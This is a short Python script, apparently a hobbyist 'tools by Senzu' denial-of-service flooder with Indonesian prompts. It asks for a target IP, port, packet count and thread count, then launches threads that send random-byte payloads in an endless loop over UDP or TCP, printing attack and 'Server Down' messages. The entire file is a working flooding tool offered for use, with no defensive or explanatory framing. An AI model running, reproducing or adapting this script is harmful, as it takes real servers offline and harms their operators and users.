#Senzu
import random
import socket
import threading
import os

os.system("clear")

print("\033[92m╭━━━┳━━━┳━╮╱╭┳━━━━┳╮╱╭╮") 
print("\033[92m┃╭━╮┃╭━━┫┃╰╮┃┣━━╮━┃┃╱┃┃") 
print("\033[92m┃╰━━┫╰━━┫╭╮╰╯┃╱╭╯╭┫┃╱┃┃") 
print("\033[92m╰━━╮┃╭━━┫┃╰╮┃┃╭╯╭╯┃┃╱┃┃") 
print("\033[92m┃╰━╯┃╰━━┫┃╱┃┃┣╯━╰━┫╰━╯┃") 
print("\033[92m╰━━━┻━━━┻╯╱╰━┻━━━━┻━━━╯") 
print(">>>  TOOLS BY SENZU  <<<")
ip = str(input(" Masukan IP:"))
port = int(input(" Port:"))
choice = str(input(" GAS?? [y/n] :"))
times = int(input("Packets?:"))
threads = int(input("Threads?:"))
def run():
	data = random._urandom(20081)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" 𝐒𝐞𝐧𝐳𝐮 𝐀𝐓𝐓𝐀𝐂𝐊!!!")
		except:
			print("[!] 𝐒𝐞𝐧𝐳𝐮!!!")

def run2():
	data = random._urandom(666666)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\u001b[31m[×] 𝐒𝐞𝐧𝐳𝐮 𝐀𝐓𝐓𝐀𝐂𝐊 TO\033[92m >>> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("[*] Server Down")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()